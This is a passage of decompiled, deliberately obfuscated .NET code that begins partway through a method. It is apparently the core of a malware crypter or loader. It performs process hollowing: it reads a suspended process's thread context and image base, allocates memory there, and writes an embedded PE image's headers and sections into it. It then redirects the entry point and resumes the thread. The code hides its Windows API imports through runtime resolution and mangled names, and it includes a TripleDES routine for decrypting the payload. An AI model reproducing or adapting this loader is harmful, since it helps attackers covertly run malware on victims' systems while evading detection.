        long num7 = ĕĖē(info.Process, 0);
      }
      else
      {
        int num8 = ćĔă(info.ƬħṟȝąƋ, ref ĢġĵĢġĵ) ? 1 : 0;
        ĐĩĺĤġ.ĒĐč ēđč3 = ēđč1;
        IntPtr process3 = info.Process;
        int address1 = checked ((int) ((long) ĢġĵĢġĵ.Ȝƀϫ + 8L));
        int num9 = checked ((int) num1);
        ref int local3 = ref num9;
        int num10 = 0;
        ref int local4 = ref num10;
        int num11 = ēđč3(process3, address1, ref local3, 4, ref local4);
        long address2 = (long) num9;
        long num12 = ĕĖē(info.Process, checked ((int) address2));
      }
      uint num13 = checked ((uint) (int) ėā(info.Process, (int) structure2.Øƥƫƚøŋąƪ.Ɨɱąǥȝ, structure2.Øƥƫƚøŋąƪ.ƧƗɱąǥȝ, 12288U, 4U));
      if (num13 == 0U)
        return;
      if (Operators.CompareString("nijdbwiabdiwbdwad", "fsfrnerwetgret", false) != 0)
      {
        ĐĩĺĤġ.ėĐč ėĐč2 = ėĐč1;
        IntPtr process4 = info.Process;
        int int32_2 = Convert.ToInt32(num13);
        byte[] buffer = ǅɫǅ;
        int int32_3 = Convert.ToInt32(structure2.Øƥƫƚøŋąƪ.ƧĦȝąƋȝṟƨ);
        int num14 = !ĐĩĺĤġ.Ңɚȋ() ? checked ((int) num2) : 0;
        ref int local = ref num14;
        int num15 = ėĐč2(process4, int32_2, buffer, int32_3, out local) ? 1 : 0;
      }
      long num16 = (long) checked (structure1.Ǆɨɨ + 248);
      int num17 = checked ((int) structure2.Ƒƚƪȝ.Ƨȝcƫƚøŋƨ - 1);
      int num18 = 0;
      while (num18 <= num17)
      {
        ptr = new IntPtr(checked ((long) int32_1 + num16 + (long) (num18 * 40)));
        ĐĩĺĤġ.ģɫɚƸȋǦǅ structure3 = (ĐĩĺĤġ.ģɫɚƸȋǦǅ) Marshal.PtrToStructure(ptr, structure3.GetType());
        byte[] numArray = new byte[checked ((int) structure3.ĳĩĺĸĥ + 1)];
        int num19 = checked ((int) ((long) structure3.ĳĩĺĸĥ - 1L));
        int index = 0;
        while (index <= num19)
        {
          numArray[index] = ǅɫǅ[checked ((int) ((long) structure3.ĐįĩĮĴĥĲ + (long) index))];
          checked { ++index; }
        }
        ĐĩĺĤġ.ėĐč ėĐč3 = ėĐč1;
        IntPtr process5 = info.Process;
        int int32_4 = Convert.ToInt32(checked (num13 + structure3.Ǆɨɨ));
        byte[] buffer = numArray;
        int int32_5 = Convert.ToInt32(structure3.ĳĩĺĸĥ);
        int num20 = ĐĩĺĤġ.Ңɚȋ() ? 0 : checked ((int) num2);
        ref int local = ref num20;
        int num21 = ėĐč3(process5, int32_4, buffer, int32_5, out local) ? 1 : 0;
        checked { ++num18; }
      }
      byte[] bytes = BitConverter.GetBytes(num13);
      ĐĩĺĤġ.ėĐč ėĐč4 = ėĐč1;
      IntPtr process6 = info.Process;
      int address3 = checked ((int) ((long) ĢġĵĢġĵ.Ȝƀϫ + 8L));
      byte[] buffer1 = bytes;
      int num22 = 0;
      ref int local5 = ref num22;
      int num23 = ėĐč4(process6, address3, buffer1, 4, out local5) ? 1 : 0;
      ĢġĵĢġĵ.Ȝąϫ = checked (num13 + structure2.Øƥƫƚøŋąƪ.Ǆɨɨ);
      int num24 = ēĔă(info.ƬħṟȝąƋ, ref ĢġĵĢġĵ) ? 1 : 0;
      int num25 = (int) ēĕ(info.ƬħṟȝąƋ);
    }

    [DllImport("ËËÉ((-382 + 451))", EntryPoint = "ËËÉ((166 + -96))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÓÓÖ(int ÊÈÊ, int ÅÅÁ, int ÃÄÀ);

    [DllImport("ËËÉ((-864 + 916))", EntryPoint = "ËËÉ((315 - 244))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÂÁÁ(int ÂÅÀ, ĐĩĺĤġ.ÃÄÄ ÕÒÖ, int ÔÔÕ);

    [DllImport("ËËÉ((1557 Xor 1569))", EntryPoint = "ËËÉ((289 >> -254))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÊÊË(int ÁÂÀ, ĐĩĺĤġ.ÒÓÒ ÁÂÅ, int ÔÔÕ);

    [DllImport("ËËÉ((6762 >> -1113))", EntryPoint = "ËËÉ((667 - 594))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÈÈË(int ÄÀÁ, int ÕÓÖ, int ÀÁÂ);

    [DllImport("ËËÉ((2318 - 2266))", EntryPoint = "ËËÉ((9 + 65))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÀÁÄ();

    [DllImport("ËËÉ((6706 >> 10759))", EntryPoint = "ËËÉ((37 + 38))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÔÒÖ(int ÖÔÓ, int ÖÕÓ, int ÒÕÖ, int ÂÁÀ);

    [DllImport("ËËÉ((6718 >> -2457))", EntryPoint = "ËËÉ((145 + -69))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÔÖÔ(int ÃÅÄ, int ÊËÉ, int ÔÓÓ, int ÁÃÃ, int ÀÅÄ);

    [DllImport("ËËÉ((13490 >> 10312))", EntryPoint = "ËËÉ((398 - 321))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÉÈÉ1(int ÄÃÂ, int ÖÖÕ);

    [DllImport("ËËÉ((-465 - -543))", EntryPoint = "ËËÉ((-127 - -206))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÒÒÓ(int ÄÀÁ, ĐĩĺĤġ.ÄÁÂ ÒÔÖ, int ÒÔÒ);

    [DllImport("ËËÉ((13480 >> 12552))", EntryPoint = "ËËÉ((321 >> 3234))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÖÒÖ(int ÊËÉ, ĐĩĺĤġ.ÍÍÌ ÄÂÂ, int ÏÏÎ);

    [DllImport("ËËÉ((13405 >> -12600))", EntryPoint = "ËËÉ((255 Xor 174))", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ÃÃÁ(int ÄÀÁ, ĐĩĺĤġ.ÏÍÎ ÅÄÃ, int ÁÄÀ);

    public static string TDes(string Text, string Password, bool Reverse = false)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        int num3 = 1;
        string str2 = (string) null;
label_1:
        num3 = 2;
        TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
label_2:
        num3 = 3;
        MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
label_3:
        num3 = 4;
        cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(Password));
label_4:
        num3 = 5;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
label_5:
        num3 = 6;
        switch (Reverse)
        {
          case false:
            goto label_10;
          case true:
            break;
          default:
            goto label_13;
        }
label_6:
        num3 = 10;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
label_7:
        ProjectData.ClearProjectError();
        num1 = -2;
label_8:
        num3 = 12;
        byte[] inputBuffer = Convert.FromBase64String(Text);
label_9:
        num3 = 13;
        str2 = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
        goto label_13;
label_10:
        num3 = 16;
        ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
label_11:
        num3 = 17;
        byte[] bytes = Encoding.ASCII.GetBytes(Text);
label_12:
        num3 = 18;
        str2 = Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
label_13:
        str1 = str2;
        goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 14:
              case 19:
              case 20:
                goto label_13;
              case 8:
              case 10:
                goto label_6;
              case 11:
                goto label_7;
              case 12:
                goto label_8;
              case 13:
                goto label_9;
              case 15:
              case 16:
                goto label_10;
              case 17:
                goto label_11;
              case 18:
                goto label_12;
              case 21:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      string str3 = str1;
      if (num2 == 0)
        return str3;
      ProjectData.ClearProjectError();
      return str3;
    }

    public static bool Ңɚȋ() => Environment.OSVersion.Version.Major == 6;

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string öòʷɚʫ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr ħąŋƋƪȝ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string öòʷɚʫ);

    private static ƬƬ c9G3r9<ƬƬ>(string öòʷɚʫ, string ϫ7ƑṾṿυ1Ȝϣ) => (ƬƬ) Marshal.GetDelegateForFunctionPointer(ĐĩĺĤġ.GetProcAddress(ĐĩĺĤġ.LoadLibraryA(ref öòʷɚʫ), ref ϫ7ƑṾṿυ1Ȝϣ), typeof (ƬƬ));

    public delegate bool ăĐ(
      string name,
      string command,
      ref ĐĩĺĤġ.ɚɫɴɑɪǅʥɨ process,
      ref ĐĩĺĤġ.ɚɫɴɑɪǅʥɨ thread,
      bool inherit,
      uint flags,
      IntPtr system,
      string current,
      [In] ref ĐĩĺĤġ.ɧɫǅɫ҅ɥɗȋɒƸ̱ǅɫɚƸȋ startup,
      out ĐĩĺĤġ.ʷƸģɗȋɒƸǅɫɚƸȋ info);

    public delegate bool ėĐč(
      IntPtr process,
      int address,
      byte[] buffer,
      int size,
      out int written);

    public delegate int ĒĐč(IntPtr process, int address, ref int buffer, int size, ref int read);

    public delegate IntPtr Ėā(
      IntPtr process,
      int address,
      uint size,
      uint type,
      uint protect);

    public delegate long ĕĖē(IntPtr process, int address);

    public delegate uint ĒĔ(IntPtr thread);

    public delegate bool ćĔă(IntPtr thread, ref ĐĩĺĤġ.ĢġĵĢġĵ ĢġĵĢġĵ);

    public delegate bool ēĔă(IntPtr thread, ref ĐĩĺĤġ.ĢġĵĢġĵ ĢġĵĢġĵ);

    public struct ÈÈÈ1
    {
      public byte ÏÎÍ;
      public byte ÎÏÌ;
      public short ÂÅÅ;
      public short ÒÓÓ;
      public short ÖÖÓ;
    }

    public struct ÃÅÂ
    {
      public int ÏÍÏ;
      public int ÈËÊ;
      public int ÅÂÁ;
      public int ÅÃÀ;
    }

    public struct ÔÒÓ
    {
      public byte ÂÂÅ;
      public byte ÎÏÌ;
      public int ÍÎÏ;
      public int ÀÂÁ;
      public int ÈÉÈ;
      public ĐĩĺĤġ.ÅÂÂ ÈÉÉ;
    }

    public struct ÔÖÖ
    {
      public int ÍÏÍ;
      public int ÈÊÊ;
    }

    public struct ÅÂÂ
    {
      public byte ÏÎÍ;
      public byte ÎÏÌ;
      public short ÂÅÅ;
      public short ÒÓÓ;
      public short ÖÖÓ;
    }

    public struct ÉÊÈ
    {
      public int ÍÏÍ;
      public int ÈÊÊ;
    }

    public struct ÉÊË1
    {
      public byte ÏÎÍ;
      public byte ÎÏÌ;
      public short ÂÅÅ;
      public short ÒÓÓ;
      public short ÖÖÓ;
    }

    public struct ÖÔÔ
    {
      public byte ÏÎÍ;
      public byte ÎÏÌ;
      public short ÂÅÅ;
      public short ÒÓÓ;
      public short ÖÖÓ;
    }

    public struct ÃÁÀ2
    {
      public int ÃÅÁ;
      public int ÖÒÔ;
    }

    public struct ÉÉÉ
    {
      public byte ÈÈÊ;
      public byte ÈËË;
      public byte ÃÅÀ;
      public byte ÌÌÏ;
    }

    public struct ÒÒÖ
    {
      public short ÍÏÍ;
      public short ÈÊÊ;
    }

    public struct ÕÕÒ
    {
      public int ÒÔÓ;
      public int ÀÃÀ;
      public int ÀÄÅ;
      public int ÃÀÁ;
      public int ÊÊÉ;
      public int ÖÕÒ;
      public short ÌÌÎ;
      public short ÄÁÅ;
      public short ÏÌÌ;
      public short ÏÏÌ;
      public int ÍÍÍ;
      public int ÅÅÅ;
      public int ÊÊÊ;
      public int ÔÒÔ;
      public int ÊÈË;
      public int ÀÀÁ;
    }

    public struct ÊÉÈ
    {
      public int ÓÕÔ;
      public int ÀÁÁ;
      public int ÂÃÄ;
      public int ÖÕÕ;
    }

    public struct ÎÏÎÎ
    {
      public string ÂÅÄ;
      public int ÃÀÂ;
      public int ÁÄÃ;
      public int ÍÍÏ;
      public int ÏÌÏ;
      public int ÂÅÂ;
      public int ÍÍÎ;
      public int ÀÃÀ;
    }

    public struct ÉËË
    {
      public int ÍÏÍ;
      public int ÈÊÊ;
    }

    public struct ÓÕÓ
    {
      public int ÍÏÏ;
      public int ÈÈÉ;
      public ĐĩĺĤġ.ÔÖÖ ÕÓÓ;
      public ĐĩĺĤġ.ÊÉÈ ÎÎÌ;
    }

    public struct ÎÎÍ
    {
      public int ÓÕÔ;
      public int ÀÁÁ;
      public int ÂÃÄ;
      public int ÖÕÕ;
    }

    public struct ÅÁÂ
    {
      public int ÍÏÍ;
      public int ÈÊÊ;
    }

    public struct ÅÄÁ
    {
      public int ÈÈÉ;
      public ĐĩĺĤġ.ÔÖÖ ÕÓÓ;
      public ĐĩĺĤġ.ÊÉÈ ÎÎÌ;
    }

    public struct ËÈÊ
    {
      public int ÍÏÍ;
      public int ÈÊÊ;
    }

    public struct ÒÓÒ
    {
      public string ÂÅÄ;
      public int ÃÀÂ;
      public int ÁÄÃ;
      public int ÍÍÏ;
      public int ÏÌÏ;
      public int ÍÍÎ;
      public int ÀÃÀ;
    }

    public struct ĢġĵĢġĵ
    {
      public uint ɑɪǅʥɨ;
      public uint Ɖ0;
      public uint Ɖ1;
      public uint Ɖ2;
      public uint Ɖ3;
      public uint Ɖ6;
      public uint Ɖ7;
      public ĐĩĺĤġ.ɧǅἿ ɧǅἿ;
      public uint ƧƓ;
      public uint ƧƑ;
      public uint ƧȜ;
      public uint ƧƉ;
      public uint ȜƋƚ;
      public uint Ȝƨƚ;
      public uint Ȝƀϫ;
      public uint ȜƋϫ;
      public uint Ȝcϫ;
      public uint Ȝąϫ;
      public uint Ȝƀƥ;
      public uint Ȝƚƥ;
      public uint Ƨc;
      public uint ȜƑƪąǥƨ;
      public uint Ȝƨƥ;
      public uint ƧƧ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] Ʀȝǥƚƨƫȝṟƨ;
    }

    public struct ɧǅἿ
    {
      public uint Cøŋƫṟøƪ;
      public uint Ƨƫąƫυƨ;
      public uint Ƭąǥ;
      public uint ȜṟṟøṟØ;
      public uint ȜṟṟøṟƧ;
      public uint ƉąƫąØ;
      public uint ƉąƫąƧ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] ƦȝǥƚƨƫȝṟĄṟȝą;
      public uint Ƨƫąƫȝ;
    }

    public struct Ӝɚɨģ
    {
      public uint Ǆɨɨ;
      public uint ĳĩĺĸĥ;
    }

    public struct ģɫɚƸȋǦǅ
    {
      public byte öòʷɚʫ;
      public ĐĩĺĤġ.Ӝɚɨģ Ӝɚɨģ;
      public uint Ǆɨɨ;
      public uint ĳĩĺĸĥ;
      public uint ĐįĩĮĴĥĲ;
      public uint ĐĲĥĬįģġĴĩįĮĳ;
      public uint ʷČɚȋ;
      public uint ȊɦɪƸģǅɫɚƸȋɨ;
      public uint ȊČɚȋ;
      public uint ɑɪǅʥɨ;
    }

    public struct ʷƸģɗȋɒƸǅɫɚƸȋ
    {
      public IntPtr Process;
      public IntPtr ƬħṟȝąƋ;
      public int ʷƸģɨɨɗ;
      public int ɬǧǅɗ;
    }

    public struct ɧɫǅɫ҅ɥɗȋɒƸ̱ǅɫɚƸȋ
    {
      public int ăĂ;
      public string ἿǄ;
      public string ɨəɫƸɥ;
      public string Ƭƚƫƪȝ;
      public int Ϫ;
      public int Ƴ;
      public int Ϫĳĩĺĸĥ;
      public int ƳƧƚȥȝ;
      public int ϪCøυŋƫ;
      public int ƳCøυŋƫ;
      public int Ƒƚƪƪ;
      public int ɑɪǅʥɨ;
      public short ƧħøϣϢƚŋƋøϣ;
      public short ƦȝƨȝṟṿȝƋB;
      public int ƦȝƨȝṟṿȝƋC;
      public int ƚŋƥυƫ;
      public int Øυƫƥυƫ;
      public int Ȝṟṟøṟ;
    }

    public struct ƘɥɫɚƸȋǅɪǦǅ
    {
      public ushort Ӝǅʥɚģ;
      public byte Major;
      public byte Minor;
      public uint ƧcøƋȝ;
      public uint ƗƉąƫą;
      public uint ƲƉąƫą;
      public uint Ǆɨɨ;
      public uint CøƋȝ;
      public uint Ƌąƫą;
      public uint Ɨɱąǥȝ;
      public uint ƧȝcƫƚøŋĄ;
      public uint ƑƚƪȝĄ;
      public ushort МąjøṟØ;
      public ushort МƚŋøṟØ;
      public ushort МąjøṟƗ;
      public ushort МƚŋøṟƗ;
      public ushort МąjøṟƧ;
      public ushort МƚŋøṟƧ;
      public uint Ṿȝṟƨƚøŋ;
      public uint ƧƗɱąǥȝ;
      public uint ƧĦȝąƋȝṟƨ;
      public uint Cħȝcƙƨυɱ;
      public ushort Ƨυƀƨƴƨƫȝɱ;
      public ushort ɑɪǅʥɨ;
      public uint ƧƧƦȝƨȝṟṿȝ;
      public uint ƧƧCøɱɱƚƫ;
      public uint ƧĦƦȝƨȝṟṿȝ;
      public uint ƧĦCøɱɱƚƫ;
      public uint LƑƪąǥƨ;
      public uint Cøυŋƫ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public ĐĩĺĤġ.ȥȥ_ƒŋ5ƫƪṟ8ǥŋø8ϣ7ϣc8j[] YZvBm2GrvaOfwbe9yyc;
    }

    public struct ɚɫɴɑɪǅʥɨ
    {
      public int Čȋʥɫǧ;
      public IntPtr ɨģɚɥɫƸ;
      public int Ɨŋħȝṟƚƫ;
    }

    public struct ƸɨǦǅ
    {
      public ushort Ӝǅʥɚģ;
      public ushort Ląƨƫ;
      public ushort Ƿąǥȝƨ;
      public ushort Ʀȝƪøcąƫƚøŋƨ;
      public ushort ĳĩĺĸĥ;
      public ushort Мƚŋƚɱυɱ;
      public ushort Мąϫƚɱυɱ;
      public ushort ƧƧ;
      public ushort ƧǷ;
      public ushort Cħȝcƙƨυɱ;
      public ushort ƗǷ;
      public ushort CƧ;
      public ushort Ƭąƀƪȝ;
      public ushort Øṿȝṟƪąƴ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] ἿǄ;
      public ushort ƗƉ;
      public ushort Ɨŋƒø;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] ƦȝƨȝṟṿȝƋB;
      public int Ǆɨɨ;
    }

    public struct ȊɫǦǅɨ
    {
      public uint Ƨƚǥŋąƫυṟȝ;
      public ĐĩĺĤġ.ɑɚɪǦǅ Ƒƚƪȝ;
      public ĐĩĺĤġ.ƘɥɫɚƸȋǅɪǦǅ Øƥƫƚøŋąƪ;
    }

    public struct ɑɚɪǦǅ
    {
      public ushort Мącħƚŋȝ;
      public ushort Ƨȝcƫƚøŋƨ;
      public uint Ƨƫąɱƥ;
      public uint Ƭąƀƪȝ;
      public uint Ƨƴɱƀøƪƨ;
      public ushort ĳĩĺĸĥ;
      public ushort ɑɪǅʥɨ;
    }

    public struct ȥȥ_ƒŋ5ƫƪṟ8ǥŋø8ϣ7ϣc8j
    {
      public uint Ǆɨɨ;
      public uint ĳĩĺĸĥ;
    }

    public struct ÃÄÄ
    {
      public short ÕÕÓ;
      public short ÃÄÃ;
      public int ÏÏÏ;
      public string ÂÂÂ;
    }

    public struct ÏÍÎ
    {
      public int ÕÔÔ;
      public int ÉÊÊ;
      public int ÁÅÀ;
      public int ÏÍÍ;
      public int ÖÒÕ;
      public int ÒÕÔ;
    }

    public struct ÍÍÌ
    {
      public short ÕÕÓ;
      public short ÃÄÃ;
      public int ÏÏÏ;
      public string ÂÂÂ;
      public int ÃÁÅ;
      public int ÉÈÈ;
    }

    public struct ÏÏÍ
    {
      public int ÕÔÔ;
      public int ÉÊÊ;
      public int ÀÂÂ;
      public int ÒÖÖ;
      public int ÅÁÃ;
      public string ÖÖÔ;
      public string ÒÓÔ;
      public int[] ÁÄÅ;
      public int[] ÍÎÌ;
    }

    public struct ÄÁÂ
    {
      public int ÕÔÔ;
      public int ÕÕÕ;
      public int ÔÔÔ;
      public int ÉËÈ;
      public int ÈËÉ;
      public ĐĩĺĤġ.ÏÏÍ ÓÔÕ;
    }
  }
}
